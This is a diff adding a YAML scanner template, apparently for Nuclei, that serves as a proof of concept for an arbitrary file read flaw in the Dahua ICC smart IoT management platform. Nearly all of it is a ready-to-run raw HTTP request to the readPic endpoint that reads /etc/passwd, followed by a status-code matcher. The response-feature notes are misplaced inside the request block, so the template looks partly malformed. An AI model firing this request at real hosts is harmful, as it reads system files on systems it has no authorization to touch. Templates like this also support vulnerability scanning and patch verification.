@@ -1,0 +1,46 @@
+id: poc-lyuukpxkasghopf5
+info:
+  name: 大华智能物联综合管理平台ICC readpic任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lyuukpxkasghopf5'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lyuukpxkasghopf5
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd HTTP/1.1
+
+
+    Connection: close
+
+
+    Accept: */*
+
+
+    Accept-Language: en
+
+
+    Accept-Encoding: gzip
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?root)(?=.*?bin).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
